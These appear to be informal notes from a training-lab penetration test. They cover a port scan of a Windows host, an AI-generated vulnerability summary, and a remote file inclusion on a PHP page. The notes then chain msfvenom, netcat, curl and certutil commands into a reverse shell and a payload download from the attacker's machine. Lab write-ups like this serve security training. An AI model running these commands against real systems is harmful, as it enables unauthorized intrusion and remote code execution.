Results show that it's a windows device due to all the msrpc ports open.

AlsoÂ 445 is SMB

Zenith AI analysis:

FileZilla FTP Server 0.9.41 beta (Port 21):

FileZilla version 0.9.41 is a beta version, which means it might not be stable and may contain undiscovered vulnerabilities. It is advisable to update to a stable version.

  

Microsoft Windows RPC (Ports 135, 49664-49669):

Remote Procedure Call (RPC) services are known to have potential vulnerabilities that can be exploited, such as buffer overflows, DoS attacks, or unauthorized access.

  

NetBIOS-ssn (Port 139) and Microsoft-ds (Port 445):

These services are used for file sharing and are associated with theÂ SMBÂ protocol. Vulnerabilities in these services can lead to unauthorized access or information disclosure, such as the EternalBlue exploit.

  

MySQL/MariaDB (Port 3306):

The MariaDB server is restricting access from the host '192.168.49.53'. Weak configurations and outdated versions can lead to vulnerabilities like SQL injection, privilege escalation, and information disclosure.

  

Apache HTTP Server 2.4.43 with OpenSSL/1.1.1g and PHP/7.4.6 (Ports 4443 and 8080):

Apache, OpenSSL, and PHP are well-known software with various vulnerabilities, depending on the version and configuration. The server might be susceptible to attacks like cross-site scripting (XSS), remote code execution, or man-in-the-middle (MITM) attacks if not configured properly.

  

Pando-pub? (Port 7680):

The service running on this port is not identified, which may warrant further investigation.

  

SMB Security Mode:

The SMB configuration allows message signing, but it is not required, which could expose the host to man-in-the-middle (MITM) attacks.

#windows target

So now to check the versions for vulns.

Now to check theÂ web pages on 443 and 8080Â to see if there are websites since there's a Maria database on 3306 so it may be worth seeing if I can edit it through the sites

  

443 on https didn't load but 8080 did

WellÂ imgÂ is sus since it shows the files like that.Â 

AlsoÂ siteÂ is sketch since it references the page as a .php file via local file inclusion LFI so maybe I can grab other things that arent local?Â 

My IP is 192.168.49.53 so I'll try a netcatÂ ncÂ reverse listener

1. Catch:Â sudo nc -nlvp 80Â 
    
2. Send:Â curl http://192.168.53.53:8080/site/index.php?page=http://192.168.49.53/hola
    

Also wow the proving grounds default Kali is so slow. Will need to VPN in and do these on my own kali since this is ridiculous

Well the target system spoke spanish but no "Hola! Como Estas?"Â /holaÂ page from me thus the connection closed.

At least it can connect to an attack box and try to pull a page so now to have it pull a reverse shell from me.Â

Weaponization

I read somewhere that it's best to first pull a script that isn't the reverse shell but a page that then downloads the rev shell once it's already been downloaded to the target server. Since the target webserver reads php we'll match format and give it a php file.

Let's craft the reverse shell via venom

Since target is running a php site we'll use a php reverse shell. Also since 445 is open we can use that as a listening port since it is already open and won't be easily blocked.

msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=445 > reverse.php

Exploit

Now to set up a http server so target can actually download them:

python3 -m http.server 80

curl http://192.168.53.53:8080/site/index.php?page=http://192.168.49.53/reverse.php

It's normal to have 10's of thousands of bytes of bloat bs since it's windows.

Now to download new TFTP.EXE file

certutil.exe -f -urlcache -splitÂ [http://192.168.49.53:80/TFTP.EXE](http://192.168.49.53/TFTP.EXE)

Got 200 codes from my http server for the new .exe so now make a new listener and wait for the connection to catchÂ  for a system level root before looking for the system level flags.

And GOTEM
